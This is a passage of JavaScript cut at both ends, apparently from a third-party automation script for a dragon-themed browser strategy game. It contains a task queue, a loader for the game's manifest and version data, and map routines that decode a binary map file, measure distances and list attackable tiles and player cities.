								console.log ('ERROR: Queue: ' + self.caller + ' - callback: '+ e)
							}
							
							self.running = false;
							// call the next task in the queue
							setTimeout ( self.next, delay_next );
						}
						callback_added = true;
					}
					
					// check if we have a onFailure callback function
					if ( args[0].onFailure && args[0].onFailure instanceof Function )
					{
						// store the callback function 
						var failure_callback = args[0].onFailure;
						// replace the callback function incorporating the stored callback
						args[0].onFailure = function( r )
						{
							// call the stored callback
							try {
								failure_callback( r );
							} catch(e){
								console.log ('ERROR: Queue: ' + self.caller + ' - onFailure: '+ e)
							}
							// call the callback of the queue obj ( if there )
							try {
								if ( callback ) callback( r );
							} catch(e){
								console.log ('ERROR: Queue: ' + self.caller + ' - callback: '+ e)
							}
							
							self.running = false;
							// call the next task in the queue
							setTimeout ( self.next, delay_next );
						}
						callback_added = true;
					}
				}
			}
			
			// if not modified callback_added, the first argument was not an object, and therefore,
			// we assume that perhaps the callback is in the arguments array
			if ( !callback_added ) {
				// seek some function in the arguments back to forth, 
				// if we find any, we assume that is a callback
				for (var i = args.length; i >= 0; i--) 
				{
					// ok, we find a function
					if ( args[i] instanceof Function ) 
					{
						// store the callback function 
						var fn_callback = args[i];
						// replace function incorporating the stored callback
						args[i] = function( r )
						{
							// call the stored callback
							try {
								fn_callback( r );
							} catch(e) {
								console.log ('ERROR: Queue: ' + self.caller + ' - fn_callback: '+ e)
							}
							// call the callback of the queue obj ( if there )
							try {
								if ( callback ) callback( r );
							} catch(e){
								console.log ('ERROR: Queue: ' + self.caller + ' - callback: '+ e)
							}
							
							self.running = false;
							// call the next task in the queue
							setTimeout ( self.next, delay_next );
						}
						callback_added = true;
						break;
					}
				}
			}
			
			// performs the function of the current queue and 
			// send the arguments and the possible new callback
			fn.apply( this, args );
			
			// finally if no callback was modified, it is because none existed and therefore, 
			// we call the next task in the queue with a timeout
			if ( !callback_added ) {
				self.running = false;
				setTimeout ( self.next, timeout );
				// and call the queue obj callback
				try {
					if( callback ) callback();
				} catch(e){
					console.log ('ERROR: Queue: ' + self.caller + ' - timeout callback: '+ e)
				}
			}
			
		}, 
		obj.delay || t.delay, 
		Queue, 
		obj.fn, 
		obj.args, 
		obj.callback, 
		obj.timeout || t.timeout,
		obj.delay_next || 1
	);
	
  },

  /* Returns the obj at the front of the queue (without dequeuing it). If the
   * queue is empty then undefined is returned.
   */
  peek : function(){
	var t = Queue;
    // return the item at the front of the queue
    return ( t.queue.length > 0 ? t.queue[t.offset] : undefined );

  }
  
}; // End Queue


Manifest = {

	data : {},
	
	version : function ( options )
	{
		Manifest.fetchVersion({
			onSuccess : function ( r ) {
				verboseLog('Version was Successfully requested from the server');
				if ( options.onSuccess ){
					options.onSuccess ( r );
				}
			},
			onFailure : function ( r ) {
				if ( options.onFailure ){
					options.onFailure ( r );
				}
			},
			caller : 'Manifest.version'
		});
	
	},
	
	init : function ( options )
	{
		Manifest.fetchManifest({
			onSuccess : function ( r ) {
				verboseLog('Manifest was Successfully requested from the server');
				if ( options.onSuccess ){
					options.onSuccess ( r );
				}
			},
			onFailure : function ( r ) {
				if ( options.onFailure ){
					options.onFailure ( r );
				}
			},
			caller : 'Manifest.init'
		});
	},
	
	/*
		options
		{
			callback:
		}
	*/
	fetchVersion : function ( options )
	{
		var now = new Date().getTime() / 1000;
		var p = {};
		
		var url 	= (API_SERVER.indexOf('/api') > -1 ? API_SERVER.substring(0,API_SERVER.indexOf('/api')) : API_SERVER ) + '/supported_versions';
		var method	= 'GET';
		
		Data.requests.version.total++;
		
		new MyAjax.RequestDOA ({
			url       : url,
			method    : method,
			params    : p,
			nonapi    : true,
			
			onSuccess : function( r ) {
				if ( r.errors ) {
					r.errmsg = r.errors;
					Data.requests.version.errors++;
					if ( options.Failure ) {
						options.Failure ( r );
					}
					return;
				}
				
				// This holds the entire Manifest JSON data parsed as an object 
				try {
					var all_versions = eval(r);
					if (all_versions && all_versions.length > 0) {
						API_VERSION = all_versions.pop();
					} else {
						if ( options.Failure ) {
							r.errmsg = '<b>fetchVersion</b> no version in supported_version : ' + r;
							options.Failure ( r );
						}
						return;
					}
				} catch (e) {
					Data.requests.version.errors++;
					console.log('ERROR: loading version : ' + e);
					if ( options.Failure ) {
						r.errmsg = '<b>fetchVersion</b> when parse version array returned this error: ' + e;
						options.Failure ( r );
					}
					return;
				}
				
				if ( options.onSuccess ){
					options.onSuccess ( r );
				}
			},
			
			onFailure : function( r ) {
				Data.requests.version.errors++;
				if ( options.Failure ) {
					options.Failure ( r );
				}
			},
			
			delay      : options.delay || 500,
			timeout    : options.timeout || 10000,
			delay_next : options.delay_next || 1,
			caller     : (options.caller || '.unknow') + '.fetchVersion'
		});
	},
	
	/*
		options
		{
			callback:
		}
	*/
	fetchManifest : function ( options )
	{
		var now = new Date().getTime() / 1000;
		var p = {};
		
		var url 	= 'manifest.json';
		var method	= 'GET';
		
		Data.requests.manifest.total++;
		
		new MyAjax.RequestDOA ({
			url       : url,
			method    : method,
			params    : p,
			
			onSuccess : function( r ) {
				if ( r.errors ) {
					r.errmsg = r.errors;
					Data.requests.manifest.errors++;
					if ( options.Failure ) {
						options.Failure ( r );
					}
					return;
				}
				
				// This holds the entire Manifest JSON data parsed as an object 
				Manifest.data = r;
				try {
					Manifest.updateManifest();
				} catch (e) {
					Data.requests.manifest.errors++;
					console.log('ERROR: updating Manifest: ' + e);
					if ( options.Failure ) {
						r.errmsg = '<b>fetchManifest</b> when calling updateManifest returned this error: ' + e;
						options.Failure ( r );
					}
					return;
				}
				
				if ( options.onSuccess ){
					options.onSuccess ( r );
				}
			},
			
			onFailure : function( r ) {
				Data.requests.manifest.errors++;
				if ( options.Failure ) {
					options.Failure ( r );
				}
			},
			
			delay      : options.delay || 500,
			timeout    : options.timeout || 10000,
			delay_next : options.delay_next || 1,
			caller     : (options.caller || '.unknow') + '.fetchManifest'
		});
	},
	
	buildings : {
		byCityType : function ( city_type, buildable, order ) 
		{
			var buildings = Manifest.data.buildings;
			var i, j, res = [];
			if ( !buildable ) {
				buildable = 'all';
			}
			if ( !city_type ) {
				city_type = 'all';
			}
			if ( buildings.length > 0 ) 
			{
				for ( i = 0; i < buildings.length; i = i + 1 ) 
				{
					if ( buildings[i].buildable === buildable || buildable.toLowerCase() === 'all' ) 
					{
						if ( buildings[i].city_type.length > 0 ) 
						{
							for ( j = 0; j < buildings[i].city_type.length; j = j + 1 ) 
							{
								if (buildings[i].city_type[j] === city_type.toLowerCase() || city_type.toLowerCase() === 'all') 
								{
									res[res.length] = buildings[i];
									break;
								}
							}
						}
					}
				}
			}
			if ( order ) {
				res = Manifest.buildings.sortBy(res, order);
			}
			return res;
		},
		
		byLocation : function ( location, buildable, order ) 
		{
			var buildings = Manifest.data.buildings;
			var i, res = [];
			if ( !buildable ) {
				buildable = 'all';
			}
			if ( !location ) {
				city_type = 'all';
			}
			if ( buildings.length > 0 ) 
			{
				for ( i = 0; i < buildings.length; i = i + 1 ) 
				{
					if ( buildings[i].buildable === buildable || buildable.toLowerCase() === 'all' ) 
					{
						if ( buildings[i].location === location.toLowerCase() || 
							 location.toLowerCase() === 'all' ) 
						{
							res[res.length] = buildings[i];
						}
					}
				}
			}
			if ( order ) {
				res = Manifest.buildings.sortBy( res, order );
			}
			return res;
		},
		
		sortBy : function ( data, order )
		{
			var orderBy;
			if ( !order ) {
				order = {alphabetical: 'asc'};
			}
			for ( orderBy in order ) 
			{
				switch ( orderBy )
				{
				case 'alphabetical' :
					orderAlphabetical( order[orderBy] );
					break;
				case 'buildable' :
					orderBuildable( order[orderBy] );
					break;
				case 'location' :
					orderLocation( order[orderBy] );
					break;
				}
			}
			return data;
			
			function orderAlphabetical( order ) 
			{
				if (order.toLowerCase() === 'asc') 
				{
					data.sort(function (a, b) {
						var type_a = a.type.toLowerCase(), type_b = b.type.toLowerCase();
						if (type_a < type_b) {return -1}
						if (type_a > type_b) {return 1}
						return 0;
					});
				} 
				else if (order.toLowerCase() === 'desc') 
				{
					data.sort(function (a, b) {
						var type_a = a.type.toLowerCase(), type_b = b.type.toLowerCase();
						if (type_a > type_b) {return -1}
						if (type_a < type_b) {return 1}
						return 0;
					});
				}
			}
		
			function orderBuildable( order ) 
			{
				if (order === true) 
				{
					data.sort(function (a, b) {
						var buildable_a = a.buildable, buildable_b = b.buildable;
						if (buildable_a < buildable_b) {return -1}
						if (buildable_a > buildable_b) {return 1}
						return 0;
					});
				} 
				else if (order === false) 
				{
					data.sort(function (a, b) {
						var buildable_a = a.buildable, buildable_b = b.buildable;
						if (buildable_a > buildable_b) {return -1}
						if (buildable_a < buildable_b) {return 1}
						return 0;
					});
				}
			}

			
			function orderLocation( order )
			{
				if (order.toLowerCase() === 'city') 
				{
					data.sort(function (a, b) {
						var location_a = a.location.toLowerCase(), location_b = b.location.toLowerCase();
						if (location_a < location_b) {return -1}
						if (location_a > location_b) {return 1}
						return 0;
					});
				} 
				else if (order.toLowerCase() === 'field') 
				{
					data.sort(function (a, b) {
						var location_a = a.location.toLowerCase(), location_b = b.location.toLowerCase();
						if (location_a > location_b) {return -1}
						if (location_a < location_b) {return 1}
						return 0;
					});
				}
			}
		},
	},
	
	building : function ( type ) 
	{
		var b;
		
		if ( type ) {
			for (b = 0; b < Manifest.data.buildings.length; b = b + 1) {
			
			}
		} else {
			// Return an error message because no type was specificed
		}
	},
	
	updateManifest : function () 
	{
		var data, i, j;
		
		//init all_items
		data = Manifest.data.store;
		Items.all_items = data;
		
		// Initialise levels for each building & Save requirements and Stats
		data = Manifest.data.buildings;
		
		for ( i = 0; i < data.length; i++ ) 
		{
			if ( !Seed.requirements.building[ data[i].type ] )
			{
				Seed.requirements.building[ data[i].type ] = {};
			}
			
			if ( !Seed.requirements.building[ data[i].type ].level )
			{
				Seed.requirements.building[ data[i].type ].level = [];
			}
			
			if ( !Seed.stats.building[ data[i].type ] ) 
			{
				Seed.stats.building[ data[i].type ] = {};
			}
			
			if ( !Seed.stats.building[ data[i].type ].level )
			{
				Seed.stats.building[ data[i].type ].level = [];
			}
			
			for ( j=0; j < data[i].levels.length; j++ )
			{
				Seed.requirements.building[ data[i].type ].level[ data[i].levels[j].level ] = data[i].levels[j].requirements;
				// add time to stats
				Seed.stats.building[ data[i].type ].level[data[i].levels[j].level] = { time : data[i].levels[j].time };
			}
		}

		// Initialise levels for each research & Save requirements and Stats
		data = Manifest.data.research;
		
		for ( i = 0; i < data.length; i++ ) 
		{
			if ( !Seed.requirements.research[ data[i].type ] )
			{
				Seed.requirements.research[ data[i].type ] = {};
			}
			
			if ( !Seed.requirements.research[ data[i].type ].level )
			{
				Seed.requirements.research[ data[i].type ].level = [];
			}
			
			if ( !Seed.stats.research[ data[i].type ] ) {
				Seed.stats.research[ data[i].type ] = {};
			}
			
			if ( !Seed.stats.research[ data[i].type ].level )
			{
				Seed.stats.research[ data[i].type ].level = [];
			}
			
			for ( j=0; j < data[i].levels.length; j++ )
			{
				Seed.requirements.research[ data[i].type ].level[ data[i].levels[j].level ] = data[i].levels[j].requirements;
				// add time to stats
				Seed.stats.research[ data[i].type ].level[data[i].levels[j].level] = { time : data[i].levels[j].time };
			}
		}
		
		// Initialise units & Save requirements and Stats ( by Jawz )
		data = Manifest.data.city.capital.units;
		
		for ( i = 0; i < data.length; i++ )
		{
			if ( !Seed.requirements.unit[ data[i].type ] )
			{
				Seed.requirements.unit[ data[i].type ] = [];
			}
			Seed.requirements.unit[ data[i].type ] = data[i].requirements;
			
			if ( !Seed.stats.unit[data[i].type] )
			{
				Seed.stats.unit[data[i].type] = {};
			}
			
			Seed.stats.unit[data[i].type] = data[i].stats;
			// add time & upkeep to stats
			Seed.stats.unit[data[i].type].time = data[i].time;
			Seed.stats.unit[data[i].type].upkeep = data[i].upkeep;
			// Jawz
			Seed.stats.unit[data[i].type].trainable = {};
		}
		
		// Jawz
		// Initialise for units an array of cities where the unit is trainable
		data = Manifest.data.city;
		for (var city in data) {
			units = (data[city]).units;
			for (i=0; i < units.length; i++) {
				Seed.stats.unit[units[i].type].trainable[city] = units[i].trainable;
			}
		}
		
		// Jawz
		// Initialise troops resurrection requirements and Stats
		data = Manifest.data.city.spectral.units;
		
		for ( i = 0; i < data.length; i++ )
		{
			if ( !Seed.requirements.resurrect[ data[i].type]  ) {
				Seed.requirements.resurrect[ data[i].type ] = [];
			}
			
			Seed.requirements.resurrect[ data[i].type ] = data[i].requirements;
			
			if ( !Seed.stats.resurrect[data[i].type] )
			{
				Seed.stats.resurrect[data[i].type] = {};
			}
			
			Seed.stats.resurrect[data[i].type] = data[i].stats;
			// add time & upkeep to stats
			Seed.stats.resurrect[data[i].type].time = data[i].time;
			Seed.stats.resurrect[data[i].type].upkeep = data[i].upkeep;
		}

		// Save quests manifest
		data = Manifest.data.quests;
	
		for ( i = 0; i < data.length; i++ )
		{
			if ( !Seed.quests.category[i] ) {
				Seed.quests.category[i] = [];
			}
			Seed.quests.category[i] = data[i][0];
			
			for ( j = 0; j < data[i][1].length; j++ )
			{
				if ( !Seed.quests.list[ data[i][0] ] ) {
					Seed.quests.list[ data[i][0] ] = [];
				}
				var rec = {
					name		: data[i][1][j].name,
					recommended	: data[i][1][j].recommended,
					reward		: data[i][1][j].reward
				};
				Seed.quests.list[ data[i][0] ].push( rec );
			}
		}

		// Save Great Dragons statistics levels & armor
		data = Manifest.data.armors;
		if ( !Seed.requirements.dragon ) {
			Seed.requirements.dragon ={};
		}
		if ( !Seed.stats.dragon ) {
			Seed.stats.dragon ={};
		}                           
		//console.log('Dragons.DRAGON_OBJ_ID='+inspect(Dragons.DRAGON_OBJ_ID,8,1));
		for ( var i = 0; i < Dragons.DRAGON_OBJ_ID.length; i++)
		{
			if (!Dragons.DRAGON_OBJ_ID[i]) continue;
			var obj_name = Dragons.DRAGON_OBJ_ID[ i ].toLowerCase();
			var dragon_name = Dragons.DRAGONS_NAMES[i];
			// initialize requirements for dragon
			if ( obj_name != '' ) {
				if ( !Seed.requirements.dragon[ obj_name ]  ) {
					Seed.requirements.dragon[ obj_name ] ={};
				}
				if ( !Seed.stats.dragon[ obj_name ]  ) {
					Seed.stats.dragon[ obj_name ] ={};
				}
				Seed.stats.dragon[ obj_name ].time = 0;
				if ( !Seed.requirements.dragon[ obj_name ].buildings  ) {
					if ( obj_name === 'spectral_dragon' ) {
						Seed.requirements.dragon[ obj_name ].buildings = {SpectralDragonKeep : 10};
						Seed.requirements.dragon[ obj_name ].resources = {blue_energy : 1700000};
					} else { 
						Seed.requirements.dragon[ obj_name ].buildings = {DragonKeep : 8};
					}
				}
				if ( !Seed.requirements.dragon[ obj_name ].research  ) {
					Seed.requirements.dragon[ obj_name ].research = {AerialCombat : 1 };
				}
				if ( !Seed.requirements.dragon[ obj_name ].items  ) {
					Seed.requirements.dragon[ obj_name ].items = {};
				}
				for (var armor_piece in data[ obj_name ]) {
					if ( obj_name === 'spectral_dragon' ) {
						var piece = armor_piece.capitalize();
						if ( piece === 'Claws' ) piece = 'Talons';
						var item = dragon_name + piece;
					} else {
						var item = (data[ obj_name ])[ armor_piece ] [0];
					}
					Seed.requirements.dragon[ obj_name ].items [ item ] = 1;
				}
				if ( obj_name === 'spectral_dragon' ) {
					Seed.requirements.dragon[ obj_name ].items [ 'AnthropusTalisman' ] = 100000
				}
			}
			if ( obj_name == '' || !Manifest.data[ obj_name + '_levels' ] ) continue;
			Seed.stats[ obj_name ] = Manifest.data[ obj_name + '_levels' ];
		}

		// End Jawz
	}

};



Map = {
	map_bin      : null,
	x			 : 0,
	y			 : 0,
	pattern		 : false,
	last_request : 0,
	requests	 : 0,
	names : {
		race : {
			1	: 'amazon',
			2	: 'primus',
			3	: 'solarian',
			4	: 'zolmec',
			'amazon'	: 1,
			'primus'	: 2,
			'solarian'	: 3,
			'zolmec'	: 4,
		},
		type : {
			0  : 'Bog',
			1  : 'Plain',
			2  : 'Mountain',
			3  : 'Forest',
			4  : 'Hill',
			5  : 'Grassland',
			6  : 'Lake',
			7  : 'City',
			8  : 'AnthropusCamp',
			9  : 'Clouds',
			99 : 'Outpost',
			'Bog'			:0,
			'Plain'			:1,
			'Mountain'		:2,
			'Forest'		:3,
			'Hill'			:4,
			'Grassland'		:5,
			'Lake'			:6,
			'City'			:7,
			'AnthropusCamp' :8,
			'Clouds'		:9,
			'Outpost'		:99
		},
		cities :{
			0	: 'City',
			1	: 'Water',
			2	: 'Stone',
			3	: 'Fire',
			4	: 'Wind',
			5	: 'Ice',
			6 : 'Swamp',
			7 : 'Forest',
			8 : 'Desert',
			10	: 'Spectral',
			'City'			:0,
			'Water'			:1,
			'Stone'			:2,
			'Fire'			:3,
			'Wind'			:4,
			'Ice'			:5,
			'Swamp'		:6,
			'Forest'  :7,
			'Desert'  :8,
			'Spectral'		:10,
		}
	},
	
	targets : {
		AnthropusCamp:[],
		Forest		 :[],
		Grassland	 :[],
		Hill		 :[],
		Lake		 :[],
		Mountain	 :[],
		Plain		 :[],
		Bog			:[],
		City		 :[],
		Outpost		 :[],
		Wildernesses :[]
	},
	
	states : {},
	
	initMapData : function (options)
	{
		var t = Map;
		Map.fetchMap({
			onSuccess : function ( r ) {
				verboseLog('Map was Successfully requested from the server');
				if ( options.onSuccess ){
					options.onSuccess ( r );
				}
			},
			onFailure : function ( r ) {
				if ( options.onFailure ){
					options.onFailure ( r );
				}
			},
			caller : 'Map.initMapData'
		});
	},	
	
	fetchMap : function ( options )
	{
		var now = new Date().getTime() / 1000;
		var p = { 'b' : MAP_BIN_CACHEBREAKER };
		
		var url 	= S3_SERVER + S3_SWF_PREFIX + '/map.bin';
		var method	= 'GET';
		
		
		new MyAjax.RequestDOA ({
			url       : url,
			method    : method,
			params    : p,
			binary    : true,
			nonapi    : true,
			
			onSuccess : function( r ) {
				if ( r.errors ) {
					r.errmsg = r.errors;
					Data.requests.manifest.errors++;
					if ( options.Failure ) {
						options.Failure ( r );
					}
					return;
				}
				
				// Prepare MAP DATA
				try {
					Map.map_bin = new jDataView( r );
				} catch (e) {
					console.log('ERROR: decoding map.bin : ' + e);
					if ( options.onFailure ) {
						r.errmsg = '<b>fetchMap</b> when decoding map.bin returned this error: ' + e;
						options.onFailure ( r );
					}
					return;
				}
				
				if ( options.onSuccess ){
					options.onSuccess ( r );
				}
			},
			
			onFailure : function( r ) {
				Data.requests.manifest.errors++;
				if ( options.Failure ) {
					options.Failure ( r );
				}
			},
			
			delay      : options.delay || 500,
			timeout    : options.timeout || 10000,
			delay_next : options.delay_next || 1,
			caller     : (options.caller || '.unknow') + '.fetchMap'
		});

	},
	
	init : function ()
	{
		var t = Map;
		
		// Save our coords
		t.x = Seed.cities[0].x || 0;
		t.y = Seed.cities[0].y || 0;
		
		Data.init({
			map	: {
				terrain : {},
				players : {},
				alliance: {}
			},
		});
		
		// Check Our Coords
		t.checkOurCoords();
		
		// set Ourselves Data Map
		t.CheckOurselves();
		
	},
	
	CheckOurselves : function (target)
	{
		var t = Map;
		var s = Seed;
		
		//Check your wildernesses
		var target_is_mine = false;

		for ( var i = 0; i < s.player.player_wildernesses.length; i++ )
		{
			var wilderness = s.player.player_wildernesses[ i ];
			var xy = wilderness.x + ',' + wilderness.y;
			
			Data.map.terrain[ xy ] = [
				s.player.id,
				s.player.cities.capital.name,
				-1,
				wilderness.level,
				0,
				t.names.type[ wilderness.type ]
			];
			t.states[ xy ] = {
				attackable  : false,
				last_attack : 0,
			};
			if ( target && target.player_id && target.player_id === s.player.id ) {
				var t_xy = target.x + ',' + target.y;
				if ( t_xy === xy ) target_is_mine = true;
			}	
		}
		
		for ( var city_idx = 0; city_idx < s.cities.length; city_idx++ )
		{
			if ( !s.cities[city_idx] )
			{
				continue;
			}
			var city = s.cities[city_idx];
			var xy = city.x + ',' + city.y;
			var city_name = ''
			var city_level = 0;
			if (city.type === 'Capital' ) {
				city_name = 'City';
				city_level = Buildings.getLevel( city_idx ,'Fortress').min;
			}	else {
				city_name = city.outpost_type.replace('DragonOutpost','');
				city_level = city.level;
			}
			Data.map.terrain[ xy ] = [
				s.player.id,
				s.player.cities.capital.name,
				t.names.cities[ city_name ],
				city_level,
				0,
				-1
			];
			t.states[ xy ] = {
				attackable  : false,
				last_attack : 0,
			};
			if ( target && target.player_id && target.player_id === s.player.id ) {
				var t_xy = target.x + ',' + target.y;
				if ( t_xy === xy ) target_is_mine = true;
			}	
		}
		
		if ( target && target.player_id && target.player_id === s.player.id && !target_is_mine ) {
			var t_xy = target.x + ',' + target.y;
			delete Data.map.terrain[ t_xy ];
			t.states[ xy ] = {
				attackable  : true,
				last_attack : 0,
			};
		}	
		
		var alliance_id = s.player.alliance && s.player.alliance.id ? s.player.alliance.id : 0;
		
		Data.map.players[ s.player.id ] = [
			s.player.name,
			s.player.race,
			s.player.level,
			s.player.might,
			alliance_id,
			1
		];
		
		if ( alliance_id ) {
			Data.map.alliance[ alliance_id ] = s.player.alliance.name;			
		}

	},
		
	getDistance : function ( x_ini, y_ini, x_end, y_end )
	{
		// Pythagorean theorum for the hypotenuse of a right triangle
		function abs(n){ return n < 0 ? -n : n; }
		var x = abs( x_end - x_ini );
		if (x > 375) x = 750 - x;
		var y = abs( y_end - y_ini );
		if (y > 375) y = 750 - y;
		return Math.round( 100 * Math.sqrt(x * x + y * y) ) / 100;
	},
	
	normalize : function( n )
	{
		if (n > 749){
			return n - 750;
		}
		if (n < 0){
			return n + 750;
		}
		return n;
	},
	
	countTargets : function (options)
	{
		var t = Map;

		if (!options.type) options.type='all';

		if (!options.radius) {
			var f_pos_x = 0;
			var l_pos_x = 750;
			
			var f_pos_y = 0;
			var l_pos_y = 750;

		} else {
			if (typeof options.x == 'undefined') options.x = t.x;
			if (typeof options.y == 'undefined') options.y = t.y;
		
			var radius = options.radius;
			var f_pos_x = options.x - radius;
			var l_pos_x = options.x + radius;
			
			var f_pos_y = options.y - radius;
			var l_pos_y = options.y + radius;
		}

		var res={
			AnthropusCamp:0,
			Forest		 :0,
			Grassland	 :0,
			Hill		 :0,
			Lake		 :0,
			Mountain	 :0,
			Plain		 :0,
			Bog          :0,
			City		 :0,
			Outpost		 :0,
			Wildernesses :0,
		};
				
		for ( var x = f_pos_x; x < l_pos_x; x++)
		{
			for ( var y = f_pos_y; y < l_pos_y; y++)
			{
				
				var coord_x = t.normalize (x);
				var coord_y = t.normalize (y);
				
				var xy = coord_x + ',' +coord_y;
				
				//didi : 14/02 : on change de formule
				var tile = t.map_bin.getUint8 ( coord_y + (coord_x * 750) + 2);
				//var tile = t.map_bin.getInt8 ( coord_y + (coord_x * 749) );

				var terrain_type  = (tile >> 4) &0x0f;
				
				// Skip Clouds
				if (  !terrain_type || terrain_type == 9 ){
					continue;
				}

				var terrain = Data.map.terrain[ xy ];
				
				if (terrain) {
					if (terrain[2] && terrain[2] > 0) {
						terrain_type = 99; //Didi modif : outpost
					}
				} else {
					if ( terrain_type == 7 ){
						terrain_type = 0; //Didi modif : it's a Bog without city
					}
				}
				res[t.names.type[terrain_type]]++;
			}
		}

		if (options.type !== 'all') {
			for (var t in res) {
				if ( t !== options.type) {
					delete res[t];
				}
			}
		}
		
		return res;
	},
	
	getTargets : function ( options )
	{
		var t = Map;
		
		var terrains = {
			AnthropusCamp:[],
			Forest		 :[],
			Grassland	 :[],
			Hill		 :[],
			Lake		 :[],
			Mountain	 :[],
			Plain		 :[],
			Bog          :[],
			City		 :[],
			Outpost		 :[],
			Wildernesses :[],
		};
		
		var already = {}; //Didi modif : to prevent double
		if (typeof options.x == 'undefined') options.x = t.x;
		if (typeof options.y == 'undefined') options.y = t.y;
		
		var radius = options.radius || 16;
		var pos_x = options.x;
		var pos_y = options.y;
		
		// Terrains
		for ( var x = pos_x - radius; x < pos_x + radius; x++)
		{
			for ( var y = pos_y - radius; y < pos_y + radius; y++)
			{
				
				var coord_x = t.normalize (x);
				var coord_y = t.normalize (y);
				
				//didi : 14/02 : on change de formule
				var tile = t.map_bin.getUint8 ( coord_y + (coord_x * 750) + 2);
				//var tile = t.map_bin.getInt8 ( coord_y + (coord_x * 749) );

				var type  = (tile >> 4) &0x0f;
				var level = tile &0x0f;
				
				// Skip Clouds
				if (  !type || type == 9 ){
					continue;
				}
				
				var xy = coord_x + ',' +coord_y;
				
				if ( ! t.states[ xy ] ) {
					t.states[ xy ] = {
						attackable  : true,
						last_attack : 0,
					};
				}

				var obj = {
					x	  : coord_x,
					y	  : coord_y,
					type  : type,
					level : level,
					attackable  : t.states[ xy ].attackable
				};
				
				// Didi : control wilderness, wilderness abandonned, city and oupost 
				if ( Data.map.terrain[ xy ]  && Data.map.terrain[ xy ][0] ) 
				{
					t.CheckOurselves({	x : coord_x,
														y : coord_y,
														player_id : Data.map.terrain[ xy ][0]});
				}
				
				var terrain = Data.map.terrain[ xy ];
				var terrain_type = type;

				if ( terrain )
				{
					obj.player_id = terrain[0] ? terrain[0] : false;
					obj.city_name = terrain[1];
					obj.city_type = Map.names.cities[ terrain[2] ];
					obj.level     = ( terrain[3] || obj.level );
					obj.healing   = terrain[4];
					obj.wild_type = Map.names.type[ terrain[5] ];
					
					if ( obj.player_id )
					{
						var player = Data.map.players[ obj.player_id ];
						if ( player )
						{
							obj.player_name	   = player[0];
							obj.race	       = player[1];
							obj.player_level   = player[2];
							obj.might          = player[3];
							obj.alliance       = Data.map.alliance[ player[4] ] || player[4];
							obj.is_friend      = player[5];
							
							// Didi modif : not attack same if player is not in alliance
							obj.attackable = t.states[ xy ].attackable = false;
							//obj.attackable = t.states[ xy ].attackable = obj.alliance ? false : true;
						}
					}

					if (terrain[2] && terrain[2] > 0) {
						terrain_type = 99; //Didi modif : outpost
					}
				} else {
					if ( type == 7 ){
						terrain_type = type = 0; //Didi modif : it's a Bog without city
					}
				}
				
				obj.dist = t.getDistance ( t.x, t.y, coord_x, coord_y );
				
				 //Didi modif : to prevent double
				if (!already[xy]) {
					already[xy]  = {add : false}
				}
				if (!already[xy].add) {
					terrains[ t.names.type[terrain_type] ].push( obj );
					already[xy].add = true;
				}
	
			}
		}
		
		Map.targets = terrains;
		
		return terrains;
	},
	
	
	tileAt : function( options )
	{
		var t = Map;
		
		//Didi : bug with zero x or y (zero is false)
		if (typeof options.x == 'undefined') options.x = t.x;
		if (typeof options.y == 'undefined') options.y = t.y;
		
		var x = options.x;
		if ((x < 0) || (x > 0))
			x = t.normalize ( x );
		var y = options.y;
		if ((y < 0) || (y > 0))
			y = t.normalize ( y );
		
		var tile = t.map_bin.getInt8 ( y + (x * 750) + 2 );

		var type  = (tile >> 4) &0x0f;
		var level = tile &0x0f;
		
		
		var xy = x + ',' + y;
				
		// Didi : control wilderness, wilderness abandonned, city and oupost 
		if ( type != 8 && Data.map.terrain[ xy ]  && Data.map.terrain[ xy ][0] && Data.map.terrain[ xy ][0] ) 
		{
			t.CheckOurselves({	x : x,
												y : y,
												player_id : Data.map.terrain[ xy ][0]});
			
		}

		if ( ! t.states[ xy ] ) {
			t.states[ xy ] = {
				attackable  : true,
				last_attack : 0,
			};
		}
		
		var target = {
			x	  : x,
			y	  : y,
			type  : type,
			level : level,
			attackable  : t.states[ xy ].attackable
		};
				
		// No need to request more data for AnthropusCamp
		if ( type == 8 ) {
			if ( options.onSuccess ){
				options.onSuccess ( target );
			}
			return;
		}
		
		// We make sure we have the necessary data in our database
		if ( Data.map.terrain[ xy ]  && Data.map.terrain[ xy ][0] ) 
		{
			
			target.player_id = Data.map.terrain[ xy ][0];
			target.city_name = Data.map.terrain[ xy ][1];
			target.city_type = Data.map.terrain[ xy ][2];
			target.level     = Data.map.terrain[ xy ][3];
			target.healing   = Data.map.terrain[ xy ][4];
			target.wild_type = Data.map.terrain[ xy ][5];
			
			if ( Data.map.players[ target.player_id ] && Data.map.players[ target.player_id ][0] )
			{
				target.player_name   = Data.map.players[ target.player_id ][0];
					target.race	         = Data.map.players[ target.player_id ][1];
					target.player_level  = Data.map.players[ target.player_id ][2];
					target.might	     = Data.map.players[ target.player_id ][3];
					var alliance         = Data.map.players[ target.player_id ][4];
					target.alliance      = Data.map.alliance[ alliance ] || alliance;
					target.is_friend     = Data.map.players[ target.player_id ][5];
					
					if ( options.onSuccess ){
						options.onSuccess ( target );
					}
					return;
			}
			
		}
		
		var p = {};
		p['x']	= x;
		p['y']	= y;
		
		new MyAjax.RequestDOA ({
			url		  : 'map/tile_at.json',
			method	  : 'POST',
			params	  : p,
			onSuccess : function( r ){

				if ( r.map_player && r.map_player != null && r.map_player.id )
				{

					var alliance = 0;
					var is_friend = 0;
					
					var xy = r.map_terrain.x + ',' + r.map_terrain.y;
					
					if ( r.map_player.alliance ) 
					{
						alliance = r.map_player.alliance.id;
						
						Data.map.alliance[ r.map_player.alliance.id ] = r.map_player.alliance.name;
						
						target.attackable = Map.states[ xy ].attackable = false;
						
						if ( Seed.player.alliance && r.map_player.alliance.id === Seed.player.alliance.id ) {
							is_friend = 1;
						}
					}
				
					Data.map.players[ r.map_player.id ] = [
						r.map_player.name,
						r.map_player.race,
						r.map_player.level,
						r.map_player.might,
						alliance,
						is_friend
					];
					
					target.player_name   = r.map_player.name;
					target.race	         = r.map_player.race;
					target.player_level  = r.map_player.level;
					target.might	     = r.map_player.might;
					target.alliance      = Data.map.alliance[ alliance ] || alliance;
					target.is_friend     = is_friend;
					
					var city_type = r.map_terrain.type ? Map.names.cities[r.map_terrain.type] : 0;
					
					var city_name = Data.map.terrain[ xy ] ? Data.map.terrain[ xy ][1] : 0;
					
					Data.map.terrain[ xy ] = [
						r.map_terrain.map_player_id, 
						city_name,
						city_type, 
						(r.map_terrain.level || target.level), 
						(r.map_terrain.healing || 0),
						( target.type < 7 ? target.type : -1 )
					];
					
					target.player_id = r.map_terrain.map_player_id;
					target.city_name = city_name;
					target.city_type = city_type;
					target.level     = Data.map.terrain[ xy ][3];
